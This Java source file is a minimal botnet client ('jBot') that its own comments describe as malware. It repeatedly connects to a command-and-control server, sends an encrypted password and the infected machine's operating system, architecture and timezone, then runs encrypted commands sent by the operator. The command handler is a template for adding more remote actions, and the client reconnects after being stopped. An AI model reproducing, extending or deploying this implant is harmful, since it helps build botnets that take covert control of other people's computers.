package me.aaronakhtar.jbot;

import java.io.*;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.util.Locale;
import java.util.TimeZone;

public class Main {         // lets make this as minimal as possible. No dependencies, Just as small as possible.

    private static final String host = "127.0.0.1"; // change to your cnc host
    private static final int    bot_port = 120; //change to your bot port

    private static volatile boolean killSession = false;

    private static final String
            encryptionKey = "jBotEncryptionKey",
            password = "A4r0nAkht4r";

    private static Thread handleCommand(String c){
        final String comman = c.trim();
        return new Thread(){
            @Override
            public void run() {
                try {
                    String f;
                    if ((f = Aes.decrypt(comman.trim(), encryptionKey)) != null) {
                        final String[] commandArgs = f.split(" ");
                        // WE ARE USING SWITCH OVER REFLECTIONS AS I WANT THE MALWARE TO BE AS LIGHTWEIGHT AS POSSSSSIBLE.
                        switch (commandArgs[0].toLowerCase(Locale.ROOT)){

                            // DO NOT REMOVE THIS COMMAND!
                            case "kill":{
                                killSession = true;
                                break;
                            }


                            // example command
                            case "random":{
                                System.out.println();
                                System.out.println("pong");
                                System.out.println(Arrays.toString(commandArgs));
                                break;
                            }

                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        };
    }

    private static boolean listen(BufferedReader reader) throws Exception {
        String command;
        if ((command = reader.readLine()) != null) {
            try {
                handleCommand(command).start();
            }catch (Exception e) {}
        }else{
            return false;
        }
        return true;
    }

    public static void main(String[] args) {


        while(true){
            try {
                try(Socket socket = new Socket(host, bot_port);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))){
                    //os#arch#timezone
                    writer.write(Aes.encrypt(password, encryptionKey) + "\n");
                    writer.write(Aes.encrypt(System.getProperty("os.name") + "#"+System.getProperty("os.arch")+"#" + TimeZone.getDefault().getID(), encryptionKey) + "\n");
                    writer.flush();
                    socket.setSoTimeout(5000);
                    while(!killSession) {
                        try {
                            if (!listen(reader)) break;
                        } catch (Exception e) {
                            if (e instanceof SocketTimeoutException) continue;
                            break;
                        }
                    }
                    if (killSession) killSession = false;
                }
                Thread.sleep(10000); // waits 10 seconds after being killed

            }catch (Exception e){

            }


        }

    }

}
